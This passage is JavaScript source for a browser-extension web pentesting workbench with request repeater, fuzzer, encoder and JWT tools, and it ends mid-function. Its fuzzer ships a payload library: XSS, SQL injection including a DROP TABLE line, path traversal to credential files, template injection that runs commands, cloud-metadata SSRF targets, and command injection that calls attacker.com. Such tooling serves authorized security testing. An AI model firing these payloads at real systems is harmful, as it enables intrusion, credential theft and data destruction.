// PenScope v6.1 — Workbench (Repeater / Intruder / Encoder / Diff / Site Map / Auth)
//
// Standalone full-tab UI launched from the popup. Communicates with the background SW
// via chrome.runtime.sendMessage; runs requests in the source tab's page context via
// chrome.scripting.executeScript so session cookies + custom headers flow naturally.
//
// State model:
//   - SOURCE_TAB_ID    — tab being analyzed; passed in URL hash
//   - background.js    — owns tab.repeaterHistory, tab.authContexts, tab.activeAuthContext
//   - this file        — pure UI; reads/writes via messages, never owns canonical state
//
// Each sub-module follows the same shape: {init, render} where init wires DOM listeners
// once and render is called when state changes. Sub-modules are namespaced objects so
// they can be initialized in any order and don't pollute the global scope.

const params = new URLSearchParams(location.search);
const SOURCE_TAB_ID = parseInt(params.get('source')) || null;
let activeSubtab = 'repeater';
let TAB_DATA = null;
let AUTH_CTX = { active: 'Anonymous', list: [] };
let REPEATER_HISTORY = [];

// -------------------------------------------------------------------
// Utility: small helpers used across modules
// -------------------------------------------------------------------
function $(id) { return document.getElementById(id); }
function el(tag, attrs, ...kids) {
  const node = document.createElement(tag);
  if (attrs) for (const k in attrs) {
    if (k === 'class') node.className = attrs[k];
    else if (k === 'style') node.style.cssText = attrs[k];
    else if (k.startsWith('on')) node.addEventListener(k.substring(2), attrs[k]);
    else node.setAttribute(k, attrs[k]);
  }
  kids.forEach(k => {
    if (k == null) return;
    if (typeof k === 'string') node.appendChild(document.createTextNode(k));
    else node.appendChild(k);
  });
  return node;
}
function esc(s) { return String(s == null ? '' : s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function escA(s) { return esc(s).replace(/'/g,'&#39;'); }
function statusClass(s) { if (!s) return ''; if (s < 300) return 's2'; if (s < 400) return 's3'; if (s < 500) return 's4'; return 's5'; }
function fmtSize(b) { if (!b || b < 0) return '—'; if (b < 1024) return b+'B'; if (b < 1048576) return (b/1024).toFixed(1)+'K'; return (b/1048576).toFixed(1)+'M'; }
function toast(msg) {
  const t = $('toast');
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => t.classList.remove('show'), 2000);
}
function copyToClipboard(text, label) {
  navigator.clipboard.writeText(text || '').then(() => toast('Copied' + (label ? ' ' + label : '')), () => toast('Clipboard blocked'));
}
function parseHeaderBlock(text) {
  const out = {};
  if (!text) return out;
  text.split(/\r?\n/).forEach(line => {
    line = line.trim();
    if (!line || line.startsWith('#')) return;
    const idx = line.indexOf(':');
    if (idx < 1) return;
    const name = line.substring(0, idx).trim();
    const val = line.substring(idx + 1).trim();
    if (name && val) out[name] = val;
  });
  return out;
}
function parseCookieBlock(text) {
  const out = {};
  if (!text) return out;
  text.split(/\r?\n/).forEach(line => {
    line = line.trim();
    if (!line || line.startsWith('#')) return;
    const idx = line.indexOf('=');
    if (idx < 1) return;
    out[line.substring(0, idx).trim()] = line.substring(idx + 1).trim();
  });
  return out;
}
function buildHeaderBlock(obj) {
  return Object.entries(obj || {}).map(([k, v]) => `${k}: ${v}`).join('\n');
}
function buildCookieBlock(obj) {
  return Object.entries(obj || {}).map(([k, v]) => `${k}=${v}`).join('\n');
}
// Combine cookie object into a Cookie header value string
function cookieObjToHeader(obj) {
  return Object.entries(obj || {}).map(([k, v]) => `${k}=${v}`).join('; ');
}

// -------------------------------------------------------------------
// Bootstrap
// -------------------------------------------------------------------
document.addEventListener('DOMContentLoaded', async () => {
  // Wire sub-tab navigation
  document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => switchSubtab(btn.dataset.subtab));
  });

  // Source tab ID is required for everything that hits the live target
  if (!SOURCE_TAB_ID) {
    document.querySelector('.main').innerHTML = `
      <div style="padding:60px;text-align:center;color:var(--t2);font-size:13px;width:100%">
        <div style="font-size:32px;margin-bottom:12px;opacity:.5">⚠</div>
        <div>No source tab specified.</div>
        <div style="font-size:11px;color:var(--t3);margin-top:8px">Open the Workbench from the PenScope popup so it knows which tab to operate on.</div>
      </div>`;
    return;
  }

  // Pull source tab info for the target pill
  try {
    const tab = await chrome.tabs.get(SOURCE_TAB_ID);
    if (tab && tab.url) $('targetUrl').textContent = tab.url;
  } catch (e) { /* tab may have closed */ }

  // Initialize all modules. Each is idempotent — init wires DOM, refresh pulls state.
  Repeater.init();
  Intruder.init();
  Encoder.init();
  DiffView.init();
  SiteMap.init();
  AuthCtx.init();

  // Pull state once from background, then routinely refresh
  await refreshAll();

  // Footer indicator click → jump to auth contexts subtab
  $('ctxIndicator').addEventListener('click', () => switchSubtab('auth'));
});

function switchSubtab(name) {
  activeSubtab = name;
  document.querySelectorAll('.nav-btn').forEach(b => {
    const on = b.dataset.subtab === name;
    b.classList.toggle('active', on);
    b.setAttribute('aria-selected', on);
  });
  document.querySelectorAll('.subtab').forEach(s => {
    s.classList.toggle('active', s.id === 'sub-' + name);
  });
  // Each module gets a chance to re-render when revealed
  if (name === 'repeater') Repeater.render();
  if (name === 'intruder') Intruder.render();
  if (name === 'sitemap')  SiteMap.render();
  if (name === 'auth')     AuthCtx.render();
}

async function refreshAll() {
  return new Promise(resolve => {
    chrome.runtime.sendMessage({ action: 'wbGetState', tabId: SOURCE_TAB_ID }, r => {
      if (r && r.ok) {
        TAB_DATA = r.data || {};
        AUTH_CTX = r.auth || { active: 'Anonymous', list: [] };
        REPEATER_HISTORY = r.history || [];
        updateCtxIndicator();
        Repeater.render();
        SiteMap.render();
        AuthCtx.render();
      }
      resolve();
    });
  });
}

function updateCtxIndicator() {
  $('ctxName').textContent = AUTH_CTX.active || 'Anonymous';
  $('repCtxName').textContent = AUTH_CTX.active || 'Anonymous';
  // Color the dot
  const dot = $('ctxIndicator').querySelector('.ctx-dot');
  const c = AUTH_CTX.active === 'Anonymous' ? 'var(--t3)' : 'var(--purple)';
  if (dot) dot.style.background = c;
}

// Look up the active auth context's cookies + headers
function getActiveAuthMerged() {
  const active = (AUTH_CTX.list || []).find(c => c.name === AUTH_CTX.active);
  if (!active) return { cookies: {}, headers: {} };
  return { cookies: active.cookies || {}, headers: active.headers || {} };
}

// Send a single request via background → page-context fetch.
// Returns a Promise resolving to {status, headers, body, timeMs, size, error?}
function sendRequest({ method, url, headers, body, ctxName }) {
  return new Promise(resolve => {
    chrome.runtime.sendMessage({
      action: 'wbSendRequest',
      tabId: SOURCE_TAB_ID,
      req: { method, url, headers, body, ctxName: ctxName || AUTH_CTX.active },
    }, r => {
      if (chrome.runtime.lastError) {
        resolve({ error: chrome.runtime.lastError.message });
        return;
      }
      resolve(r || { error: 'no response' });
    });
  });
}

// -------------------------------------------------------------------
// REPEATER
// -------------------------------------------------------------------
const Repeater = {
  current: null,  // currently-edited request

  init() {
    $('repSendBtn').addEventListener('click', () => this.send());
    $('repClearHistory').addEventListener('click', () => this.clearHistory());
    $('repCopyCurl').addEventListener('click', () => this.copyCurl());
    $('repSendIntruder').addEventListener('click', () => this.sendToIntruder());
    $('repSendDiff').addEventListener('click', () => this.sendToDiff());

    // Allow pressing Ctrl+Enter from anywhere in the request panel to send
    ['repUrl', 'repHeaders', 'repBody'].forEach(id => {
      $(id).addEventListener('keydown', e => {
        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') { e.preventDefault(); this.send(); }
      });
    });
  },

  // Load a captured request (from endpoints / probe history / site map) into the editor
  loadFromEndpoint(ep) {
    if (!ep) return;
    const url = ep.url || ep.path || '';
    $('repMethod').value = (ep.method || 'GET').toUpperCase();
    $('repUrl').value = url;
    $('repHeaders').value = buildHeaderBlock(ep.headers || {});
    $('repBody').value = ep.body || '';
    $('repBaseLabel').textContent = ep.label ? ('From: ' + ep.label) : '';
    this.current = { method: $('repMethod').value, url, headers: ep.headers || {}, body: ep.body || '' };
    switchSubtab('repeater');
  },

  async send() {
    const method = $('repMethod').value;
    const url = $('repUrl').value.trim();
    const headers = parseHeaderBlock($('repHeaders').value);
    const body = $('repBody').value;
    if (!url) { toast('URL required'); return; }
    $('repSendBtn').disabled = true;
    $('repSendBtn').textContent = 'Sending...';
    const t0 = performance.now();
    const resp = await sendRequest({ method, url, headers, body });
    const dt = Math.round(performance.now() - t0);
    $('repSendBtn').disabled = false;
    $('repSendBtn').textContent = 'Send';

    this.renderResponse(resp, dt);
    // Push to history (newest first); cap 50
    const entry = {
      id: 'r' + Date.now() + '-' + Math.floor(Math.random() * 1000),
      ts: Date.now(),
      method, url, headers, body,
      status: resp.status || 0,
      size: resp.size || 0,
      timeMs: resp.timeMs || dt,
      error: resp.error || null,
      respBody: (resp.body || '').substring(0, 50000),
      respHeaders: resp.headers || {},
      ctxName: AUTH_CTX.active,
    };
    chrome.runtime.sendMessage({ action: 'wbHistoryPush', tabId: SOURCE_TAB_ID, entry }, () => {});
    REPEATER_HISTORY.unshift(entry);
    if (REPEATER_HISTORY.length > 50) REPEATER_HISTORY.length = 50;
    this.render();
  },

  renderResponse(resp, dt) {
    const wrap = $('repRespBody');
    if (resp.error) {
      wrap.innerHTML = `<div class="resp-section"><div style="color:var(--red);font-family:var(--mono);font-size:11px">Error: ${esc(resp.error)}</div></div>`;
      $('repTimeLabel').textContent = '';
      return;
    }
    const hdrLines = Object.entries(resp.headers || {}).map(([k, v]) => `${k}: ${v}`).join('\n');
    $('repTimeLabel').textContent = `${resp.status} · ${fmtSize(resp.size)} · ${dt}ms · via ${resp.ctxName || AUTH_CTX.active}`;
    wrap.innerHTML = `
      <div class="resp-status-bar">
        <span class="resp-status-code ${statusClass(resp.status)}">${resp.status || '—'}</span>
        <span>${fmtSize(resp.size)}</span>
        <span>${dt}ms</span>
        <span style="margin-left:auto;color:var(--t3)">ctx: ${esc(resp.ctxName || AUTH_CTX.active)}</span>
      </div>
      <div class="resp-section">
        <div class="editor-label">Headers</div>
        <pre class="resp-headers">${esc(hdrLines || '(none)')}</pre>
      </div>
      <div class="resp-section">
        <div class="editor-label">Body <span class="badge">${fmtSize((resp.body||'').length)}</span></div>
        <pre class="resp-body">${esc((resp.body || '').substring(0, 50000))}</pre>
        ${(resp.body || '').length > 50000 ? `<div class="hint">Body truncated to 50KB. Click Copy curl to replay full request offline.</div>` : ''}
      </div>`;
  },

  render() {
    // History list
    const list = $('repHistoryList');
    if (!REPEATER_HISTORY.length) {
      list.innerHTML = `<div class="empty-state" style="padding:24px 12px"><div class="empty-state-i">↻</div><div class="empty-state-s">No requests yet. Send your first one or click any endpoint in the Site Map.</div></div>`;
      return;
    }
    list.innerHTML = '';
    REPEATER_HISTORY.forEach(h => {
      const item = el('div', { class: 'rail-item' + (this.current && this.current.id === h.id ? ' active' : '') });
      item.innerHTML = `
        <span class="rail-method m-${escA(h.method || 'GET')}">${esc(h.method || 'GET')}</span>
        <span class="rail-path">${esc((h.url || '').replace(/^https?:\/\/[^/]+/, ''))}</span>
        <span class="rail-status ${statusClass(h.status)}">${h.status || '—'}</span>`;
      item.addEventListener('click', () => {
        $('repMethod').value = h.method || 'GET';
        $('repUrl').value = h.url || '';
        $('repHeaders').value = buildHeaderBlock(h.headers || {});
        $('repBody').value = h.body || '';
        this.current = h;
        // Re-render the response that was captured
        this.renderResponse({ status: h.status, size: h.size, timeMs: h.timeMs, headers: h.respHeaders, body: h.respBody, ctxName: h.ctxName, error: h.error }, h.timeMs || 0);
      });
      list.appendChild(item);
    });
  },

  clearHistory() {
    if (!confirm('Clear all repeater history?')) return;
    chrome.runtime.sendMessage({ action: 'wbHistoryClear', tabId: SOURCE_TAB_ID }, () => {
      REPEATER_HISTORY = [];
      this.render();
      toast('History cleared');
    });
  },

  copyCurl() {
    const method = $('repMethod').value;
    const url = $('repUrl').value;
    const headers = parseHeaderBlock($('repHeaders').value);
    const body = $('repBody').value;
    let cmd = `curl -i -X ${method} '${url.replace(/'/g, "'\\''")}'`;
    Object.entries(headers).forEach(([k, v]) => { cmd += ` \\\n  -H '${k}: ${v.replace(/'/g, "'\\''")}'`; });
    if (body) cmd += ` \\\n  --data-raw '${body.replace(/'/g, "'\\''")}'`;
    copyToClipboard(cmd, 'curl');
  },

  sendToIntruder() {
    $('intMethod').value = $('repMethod').value;
    $('intUrl').value = $('repUrl').value;
    $('intHeaders').value = $('repHeaders').value;
    $('intBody').value = $('repBody').value;
    switchSubtab('intruder');
    toast('Sent to Intruder. Mark insertion points with §payload§');
  },

  sendToDiff() {
    if (!this.current) { toast('No response to send'); return; }
    const right = $('diffRight');
    if (!$('diffLeft').value) {
      $('diffLeft').value = this.current.respBody || '';
      $('diffLeftBadge').textContent = `${this.current.method} ${this.current.url}`.substring(0, 60);
    } else if (!right.value) {
      right.value = this.current.respBody || '';
      $('diffRightBadge').textContent = `${this.current.method} ${this.current.url}`.substring(0, 60);
    } else {
      // Both panels populated — overwrite right
      right.value = this.current.respBody || '';
      $('diffRightBadge').textContent = `${this.current.method} ${this.current.url}`.substring(0, 60);
    }
    switchSubtab('diff');
    toast('Sent to Diff');
  },
};

// -------------------------------------------------------------------
// INTRUDER
// -------------------------------------------------------------------
// Built-in payload library. Each set is small enough to inline; pasting custom payloads
// in the right textarea overrides the built-in selection.
const PAYLOADS = {
  xss: [
    "<script>alert(1)</script>", "\"><script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "javascript:alert(1)", "'><svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>", "\"autofocus onfocus=alert(1) x=\"",
    "<a href=javascript:alert(1)>x", "<svg><script>alert(1)</script>", "data:text/html,<script>alert(1)</script>",
    "<img src=1 onerror=alert(1)>", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<style>@import 'javascript:alert(1)'</style>", "<x onfocusin=alert(1) tabindex=1 id=x>",
    "<form><button formaction=javascript:alert(1)>x", "1<input/onfocus=alert(1) autofocus>",
    "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
    "javasc&Tab;ript:alert(1)", "<ScRipT>alert(1)</sCripT>",
    "</textarea><script>alert(1)</script>", "</title><script>alert(1)</script>",
    "</style><script>alert(1)</script>", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
    "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text>",
    "<embed src=javascript:alert(1)>", "<object data=javascript:alert(1)>",
    "<base href=javascript:alert(1)//>", "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    "<link rel=stylesheet href=javascript:alert(1)>", "%3Cscript%3Ealert(1)%3C/script%3E",
    "<img src/onerror=alert(1)>", "<details/open/ontoggle=alert(1)>",
    "<svg/onload=eval(atob('YWxlcnQoMSk='))>", "<img \\x00src=x onerror=alert(1)>",
  ],
  sqli: [
    "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
    "1 OR 1=1", "1' OR '1'='1' --", "admin'--", "admin' #", "admin'/*",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "1' AND 1=CONVERT(int,@@version)--", "1' AND SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--",
    "'; DROP TABLE users--", "1' AND (SELECT COUNT(*) FROM users)>0--",
    "1)) OR 1=1--", "%27%20OR%201%3D1--", "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "0x27 OR 1=1",
    "' OR ''='", "' OR 1=1#", "1\" OR \"1\"=\"1", "1` OR `1`=`1",
    "') OR ('1'='1", "' OR sleep(5)#", "' OR pg_sleep(5)--",
    "${jndi:ldap://x.example.com/a}",
  ],
  lfi: [
    "../../../../etc/passwd", "../../../../../../etc/passwd", "/etc/passwd",
    "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/etc/passwd%00",
    "../../../../../../proc/self/environ", "../../../../../../proc/self/cmdline",
    "../../../../../../var/log/apache2/access.log", "../../../../../../var/log/nginx/access.log",
    "C:\\Windows\\System32\\drivers\\etc\\hosts", "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "file:///etc/passwd", "file://localhost/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php", "php://input",
    "expect://id", "data://text/plain,<?php phpinfo();?>",
    "../../../../../../../../etc/shadow", "../config/database.yml",
    "../../app/etc/local.xml", "../../wp-config.php", "../../config.php",
    "../../../../../../../boot.ini", "/proc/self/status",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "..../..../etc/passwd",
  ],
  ssti: [
    "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}", "{{7*'7'}}", "${{7*7}}",
    "*{7*7}", "@(7*7)", "{{config}}", "{{config.items()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}", "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    "<%= system('id') %>", "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",
    "{{this}}", "{{__class__.__init__.__globals__}}", "{php}phpinfo();{/php}",
  ],
  ssrf: [
    "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
    "http://[::1]", "http://127.1", "http://2130706433", "http://0x7f000001",
    "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/", "http://metadata.azure.com/metadata/instance",
    "file:///etc/passwd", "gopher://127.0.0.1:25/", "dict://127.0.0.1:11211/",
    "http://127.0.0.1:22", "http://127.0.0.1:6379", "http://127.0.0.1:5432",
    "http://127.0.0.1:3306", "http://127.0.0.1:9200", "http://127.0.0.1:5984",
    "http://0/", "//127.0.0.1", "@127.0.0.1", "127.0.0.1#@target.com",
  ],
  cmdi: [
    "; id", "| id", "& id", "&& id", "|| id", "`id`", "$(id)",
    "; ls -la", "| ls -la", "&& ls -la",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "%0aid", "%0a id", "\nid", "\n id",
    "; sleep 5", "| sleep 5", "&& sleep 5",
    "; ping -c 5 127.0.0.1", "| nslookup test.attacker.com",
    "${IFS}cat${IFS}/etc/passwd", "$(curl http://attacker.com)",
    "&& whoami", "; whoami", "|whoami",
  ],
  ids: Array.from({ length: 100 }, (_, i) => String(i + 1)),
  bypass: [
    "admin", "Admin", "ADMIN", "administrator", "root", "superuser", "sysadmin",
    "test", "guest", "demo", "user",
    "admin'--", "admin' OR '1'='1", "admin\"--", "' or 1=1--",
    "true", "1", "yes", "on", "enabled",
    "../admin", "..%2fadmin", "%2e%2eadmin",
    "admin/", "admin/.", "admin/..;",
    "admin?", "admin#", "admin/api",
  ],
  usernames: [
    "admin", "administrator", "root", "user", "test", "demo", "guest",
    "sysadmin", "superuser", "manager", "operator", "support",
    "service", "system", "default", "anonymous", "nobody",
    "john", "jane", "alice", "bob", "ceo", "info", "contact", "webmaster",
    "noreply", "no-reply", "donotreply",
  ],
};

const Intruder = {
  mode: 'sniper',
  selectedSet: null,
  results: [],
  running: false,

  init() {
    document.querySelectorAll('.intruder-mode-pill').forEach(b => {
      b.addEventListener('click', () => {
        this.mode = b.dataset.mode;
        document.querySelectorAll('.intruder-mode-pill').forEach(x => x.classList.toggle('active', x === b));
      });
    });
    document.querySelectorAll('.payload-set-btn').forEach(b => {
      b.addEventListener('click', () => {
        const set = b.dataset.payload;
        if (this.selectedSet === set) {
          this.selectedSet = null;
          b.classList.remove('selected');
        } else {
          this.selectedSet = set;
          document.querySelectorAll('.payload-set-btn').forEach(x => x.classList.toggle('selected', x === b));
        }
        // Auto-fill custom payloads textarea so the user sees what's loaded
        if (this.selectedSet && PAYLOADS[this.selectedSet]) {
          $('intCustomPayloads').value = PAYLOADS[this.selectedSet].join('\n');
        }
      });
    });
    $('intStart').addEventListener('click', () => this.start());
  },

  render() { /* one-shot render is fine */ },

  // Get payloads — custom textarea overrides selected set
  getPayloads() {
    const custom = $('intCustomPayloads').value.trim();
    if (custom) return custom.split(/\r?\n/).map(s => s).filter(Boolean);
    if (this.selectedSet && PAYLOADS[this.selectedSet]) return PAYLOADS[this.selectedSet];
    return [];
  },

  // Substitute payload markers (§) in a request. For sniper, returns one variant per
  // (position × payload) pair. For battering ram, replaces ALL positions with the
  // same payload. Cluster bomb produces every combination across positions. Pitchfork
  // pairs payload[i] with position[i].
  buildVariants(template, payloads, mode) {
    const variants = [];
    // Find all positions in the URL + headers + body. We use the §...§ delimiter and
    // maintain a flat list of (segment, isPosition) tuples per field.
    const fields = ['url', 'headers', 'body'];
    function tokenize(s) {
      const tokens = [];
      let last = 0;
      const re = /§([^§]*)§/g;
      let m;
      while ((m = re.exec(s)) !== null) {
        if (m.index > last) tokens.push({ text: s.substring(last, m.index), pos: false });
        tokens.push({ text: m[1], pos: true });
        last = re.lastIndex;
      }
      if (last < s.length) tokens.push({ text: s.substring(last), pos: false });
      return tokens;
    }
    const url = template.url || '';
    const headers = template.headers || '';
    const body = template.body || '';
    const tokU = tokenize(url);
    const tokH = tokenize(headers);
    const tokB = tokenize(body);
    const allTokens = [tokU, tokH, tokB];
    const positions = [];
    allTokens.forEach((toks, fi) => toks.forEach((t, ti) => { if (t.pos) positions.push({ fi, ti }); }));

    if (positions.length === 0) {
      // No positions — single request, payload not substituted
      variants.push({ url, headers, body, payload: '(no positions)' });
      return variants;
    }

    function rebuild(toks, replacements) {
      // replacements is a Map from token-index → string
      return toks.map((t, i) => replacements.has(i) ? replacements.get(i) : t.text).join('');
    }

    if (mode === 'sniper') {
      // One position at a time. For each position, for each payload, swap that one and leave others as their default text.
      positions.forEach(p => {
        payloads.forEach(pl => {
          const repl = new Map();
          repl.set(p.ti, pl);
          const newField = rebuild(allTokens[p.fi], repl);
          variants.push({
            url: p.fi === 0 ? newField : url.replace(/§([^§]*)§/g, '$1'),
            headers: p.fi === 1 ? newField : headers.replace(/§([^§]*)§/g, '$1'),
            body: p.fi === 2 ? newField : body.replace(/§([^§]*)§/g, '$1'),
            payload: pl,
          });
        });
      });
    } else if (mode === 'battering') {
      // Same payload in every position
      payloads.forEach(pl => {
        variants.push({
          url: tokU.map(t => t.pos ? pl : t.text).join(''),
          headers: tokH.map(t => t.pos ? pl : t.text).join(''),
          body: tokB.map(t => t.pos ? pl : t.text).join(''),
          payload: pl,
        });
      });
    } else if (mode === 'pitchfork') {
      // payload[i] in position[i]. We need at least N payloads for N positions.
      const N = Math.min(payloads.length, positions.length);
      // Each request: positions[0..N-1] get payloads[0..N-1] in lockstep
      const rounds = payloads.length;
      for (let r = 0; r < rounds; r++) {
        const replPerField = [new Map(), new Map(), new Map()];
        positions.forEach((p, pi) => {
          if (pi < N) replPerField[p.fi].set(p.ti, payloads[(r + pi) % payloads.length]);
        });
        variants.push({
          url: rebuild(tokU, replPerField[0]),
          headers: rebuild(tokH, replPerField[1]),
          body: rebuild(tokB, replPerField[2]),
          payload: payloads[r % payloads.length],
        });
      }
    } else if (mode === 'cluster') {
      // Cartesian product. Each position × payload. Capped to 500 to prevent runaway.
      const cap = 500;
      function gen(idx, replPerField, payloadAcc) {
        if (variants.length >= cap) return;
        if (idx >= positions.length) {
          variants.push({
            url: rebuild(tokU, replPerField[0]),
            headers: rebuild(tokH, replPerField[1]),
            body: rebuild(tokB, replPerField[2]),
            payload: payloadAcc.join(' / '),
          });
          return;
        }
        for (const pl of payloads) {
          if (variants.length >= cap) return;
          const newRepl = replPerField.map(m => new Map(m));
          newRepl[positions[idx].fi].set(positions[idx].ti, pl);
          gen(idx + 1, newRepl, [...payloadAcc, pl]);
        }
      }
      gen(0, [new Map(), new Map(), new Map()], []);
    }
    return variants;
  },

  async start() {
    if (this.running) return;
    const method = $('intMethod').value;
    const url = $('intUrl').value;
    const headers = $('intHeaders').value;
    const body = $('intBody').value;
    const payloads = this.getPayloads();
    if (!url) { toast('URL required'); return; }
    if (!payloads.length) { toast('Pick a payload set or paste custom'); return; }

    const variants = this.buildVariants({ url, headers, body }, payloads, this.mode);
    if (!variants.length) { toast('No request variants generated'); return; }

    // Hard cap to prevent accidental DoS
    const HARD_CAP = 200;
    const toRun = variants.slice(0, HARD_CAP);
    if (variants.length > HARD_CAP) toast(`Capped to ${HARD_CAP} (had ${variants.length})`);

    this.running = true;
    this.results = [];
    $('intStart').disabled = true;
    $('intStart').textContent = `Running 0/${toRun.length}...`;
    this.renderResults();

    // Get a baseline response for anomaly detection
    const baseline = await sendRequest({
      method, url: url.replace(/§([^§]*)§/g, '$1'),
      headers: parseHeaderBlock(headers.replace(/§([^§]*)§/g, '$1')),
      body: body.replace(/§([^§]*)§/g, '$1'),
    });
    const baseSize = baseline.size || 0;
    const baseStatus = baseline.status || 0;

    let i = 0;
    for (const v of toRun) {
      if (!this.running) break;
      const resp = await sendRequest({
        method, url: v.url, headers: parseHeaderBlock(v.headers), body: v.body,
      });
      this.results.push({
        i, payload: v.payload,
        url: v.url, status: resp.status || 0,
        size: resp.size || 0, time: resp.timeMs || 0,
        anomaly: (resp.status !== baseStatus) || (Math.abs((resp.size || 0) - baseSize) > 50),
        bodyPreview: (resp.body || '').substring(0, 400),
      });
      i++;
      $('intStart').textContent = `Running ${i}/${toRun.length}...`;
      // Render every 5 results so the UI stays responsive
      if (i % 5 === 0 || i === toRun.length) this.renderResults();
    }

    this.running = false;
    $('intStart').disabled = false;
    $('intStart').textContent = 'Start Attack';
    this.renderResults();
    toast(`Attack done — ${this.results.length} requests · ${this.results.filter(r => r.anomaly).length} anomalies`);
  },

  renderResults() {
    const wrap = $('intResults');
    if (!this.results.length) {
      wrap.innerHTML = `
        <div class="empty-state">
          <div class="empty-state-i">⚡</div>
          <div class="empty-state-t">No attack running</div>
          <div class="empty-state-s">Mark insertion points in the request with <span class="position-marker">§payload§</span> markers, pick a payload set or paste your own, then click <strong>Start Attack</strong>.</div>
        </div>`;
      return;
    }
    let html = `
      <table class="results-table">
        <thead>
          <tr><th>#</th><th>Payload</th><th>Status</th><th>Size</th><th>Time</th><th>Δ</th><th>Preview</th></tr>
        </thead>
        <tbody>`;
    this.results.forEach(r => {
      html += `<tr class="${r.anomaly ? 'anomaly' : ''}">
        <td>${r.i + 1}</td>
        <td class="pl">${esc(String(r.payload).substring(0, 80))}</td>
        <td class="${statusClass(r.status)}">${r.status || '—'}</td>
        <td>${fmtSize(r.size)}</td>
        <td>${r.time}ms</td>
        <td>${r.anomaly ? '<span style="color:var(--yellow)">★</span>' : ''}</td>
        <td style="max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(r.bodyPreview.replace(/\s+/g, ' ').substring(0, 100))}</td>
      </tr>`;
    });
    html += `</tbody></table>`;
    wrap.innerHTML = html;
  },
};

// -------------------------------------------------------------------
// ENCODER / DECODER
// -------------------------------------------------------------------
const Encoder = {
  init() {
    document.querySelectorAll('[data-enc]').forEach(b => {
      b.addEventListener('click', () => this.run(b.dataset.enc));
    });
    $('encCopyOut').addEventListener('click', () => copyToClipboard($('encOutput').value, ''));
    $('encSwap').addEventListener('click', () => {
      $('encInput').value = $('encOutput').value;
      $('encOutput').value = '';
    });
    $('jwtDecode').addEventListener('click', () => this.jwtDecode());
    $('jwtForgeNone').addEventListener('click', () => this.jwtForgeNone());
    $('jwtSignHs256').addEventListener('click', () => this.jwtSignHs256());
  },

  async run(op) {
    const input = $('encInput').value;
    let output = '';
    try {
      switch (op) {
        case 'b64-encode':    output = btoa(unescape(encodeURIComponent(input))); break;
        case 'b64-decode':    output = decodeURIComponent(escape(atob(input.replace(/\s/g, '')))); break;
        case 'b64url-encode': output = btoa(unescape(encodeURIComponent(input))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); break;
        case 'b64url-decode': {
          let s = input.replace(/-/g, '+').replace(/_/g, '/');
          while (s.length % 4) s += '=';
          output = decodeURIComponent(escape(atob(s.replace(/\s/g, '')))); break;
        }
        case 'url-encode':  output = encodeURIComponent(input); break;
        case 'url-decode':  output = decodeURIComponent(input); break;
        case 'html-encode': output = input.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); break;
        case 'html-decode': output = input.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&nbsp;/g, ' '); break;
        case 'hex-encode':  output = Array.from(new TextEncoder().encode(input)).map(b => b.toString(16).padStart(2, '0')).join(''); break;
        case 'hex-decode': {
          const clean = input.replace(/\s/g, '');
          const bytes = new Uint8Array(clean.length / 2);
          for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(clean.substr(i * 2, 2), 16);
          output = new TextDecoder().decode(bytes); break;
        }
        case 'md5':    output = await this.md5(input); break;
        case 'sha1':   output = await this.subtleHash('SHA-1', input); break;
        case 'sha256': output = await this.subtleHash('SHA-256', input); break;
        case 'sha512': output = await this.subtleHash('SHA-512', input); break;
      }
      $('encOutput').value = output;
    } catch (e) {
      $('encOutput').value = 'Error: ' + (e.message || String(e));
    }
  },

  async subtleHash(alg, str) {
    const buf = new TextEncoder().encode(str);
    const h = await crypto.subtle.digest(alg, buf);
    return Array.from(new Uint8Array(h)).map(b => b.toString(16).padStart(2, '0')).join('');
  },

  // SubtleCrypto doesn't expose MD5 (deprecated). Use a tiny MD5 implementation —
  // fewer than 50 lines, well-known algorithm, useful for legacy systems.
  md5(s) {
    // Compact but correct MD5 — sourced/adapted from RFC 1321 reference.
    function L(x, n) { return (x << n) | (x >>> (32 - n)); }
    function add(a, b) { return ((a + b) & 0xffffffff) >>> 0; }
